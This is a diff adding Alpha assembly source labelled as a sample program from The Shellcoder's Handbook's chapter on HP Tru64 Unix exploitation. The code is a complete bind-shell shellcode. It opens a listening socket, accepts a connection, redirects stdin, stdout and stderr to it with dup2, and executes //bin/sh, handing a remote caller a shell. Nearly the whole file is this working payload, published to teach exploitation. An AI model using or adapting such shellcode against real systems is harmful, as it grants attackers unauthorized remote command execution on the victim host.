@@ -1,0 +1,85 @@
+/*
+
+The Shellcoder's Handbook: Discovering and Exploiting Security Holes
+Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
+Sinan Eren, Neel Mehta, Riley Hassell
+Publisher: John Wiley & Sons
+ISBN: 0764544683
+
+Chapter 13: HP Tru64 Unix Exploitation
+Sample Program #9
+
+Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 
+
+*/
+
+#include <alpha/regdef.h>     
+     .text
+     .arch     generic
+     .align 4
+     .globl  main
+     .ent      main
+main:
+     .frame  $sp, 0, $26
+
+                                 #xorloop will give us the pc in a0,
+                                 #PC should be pointing to the next in-struction.
+                         #196 bytes total size.
+
+     bic  sp, 0xf, sp               #make sure the stack is 16 byte aligned
+     addq a0, 156, s1          #address of sockaddr_in. s1 preserved
+     addq a0, 172, s2          #address of sizeof(sockadd_in)   
+     addq a0, 184, s4          #address of //bin/sh     
+     stq  s4, (sp)                  #store address of //bin/sh
+     stq  zero, 8(sp)
+     
+     mov  0x2, a0               #AF_INET
+     mov  0x1, a1               #SOCK_STREAM
+     bis  zero, zero, a2       #0
+     addq zero, 0x61, v0       #socket syscall
+     PAL_callsys
+     mov  v0, s0               #saved register, preserved. store socket number.
+     
+     mov  s0, a0               #socket number.
+     mov  s1, a1               #address of sockaddr_in
+     mov  0x10, a2              #sizeof sockaddr_in = 16
+             addq zero, 0x68, v0       #bind syscall.
+     PAL_callsys
+
+     mov  s0, a0               #socket number.
+     mov  0x5, a2              #backlog.
+             addq zero, 0x6a, v0       #listen syscall.
+     PAL_callsys
+
+     mov  s0, a0               #socket number.
+     bis  zero, zero, a1       #(struct sockaddr *)NULL
+     mov  s2, a2               #address of sizeof sockaddr
+             addq zero, 0x63, v0       #accept syscall.
+     PAL_callsys
+     mov  v0, s3               #connected socket number.
+
+     mov 0x2, s2
+duploop:     
+     mov  s3, a0               #connected socket number.
+     mov  s2, a1               #stdin, stdout, stderr
+             addq zero, 0x5a, v0       #dup2 syscall
+     PAL_callsys
+     subq s2, 0x1, s2          #decrement the counter
+     bge  s2, duploop          #loop for 2,1,0 (stderr, stdout, stdin)
+     
+     mov  s4, a0               #address of //bin/sh
+     mov  sp, a1              #address of (address of //bin/sh)
+     bis  zero, zero, a2       #NULL
+             addq zero, 0x3b, v0       #execve syscall
+     PAL_callsys
+
+.long   0x901f0002      
+.long   0x00000000      
+.long   0x00000000
+.long   0x00000000
+.long   0x10
+.long   0x00000000
+.long   0x00000000     
+.quad   0x68732f6e69622f2f
+.long   0x00000000
+     .end      main
